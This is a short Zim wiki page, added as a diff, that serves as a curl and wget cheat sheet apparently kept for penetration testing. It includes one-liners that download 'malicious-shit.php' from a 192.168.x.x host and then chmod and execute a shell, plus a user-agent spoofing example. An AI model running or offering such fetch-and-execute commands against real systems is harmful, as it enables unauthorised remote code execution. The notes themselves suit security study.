@@ -1,0 +1,24 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2020-05-17T14:12:25-04:00
+
+====== curl - wget ======
+Created Sunday 17 May 2020
+
+**curl -o <filename> http://192.168.x.x/malicious-shit.php**
+
+you can also pipe in commands too such as
+
+**curl -o <filename> http://192.168.x.x/malicious-shit.php ; chmod +x shell.php ; ./shell.php**
+
+User agent change
+
+**curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"** 
+
+--------------------
+
+**wget -O <filename> http://192.168.x.x/malicious-shit.php**
+
+you can also pipe in commands too such as
+
+**wget -O <filename> http://192.168.x.x/malicious-shit.php ; chmod +x shell.php ; ./shell.php**
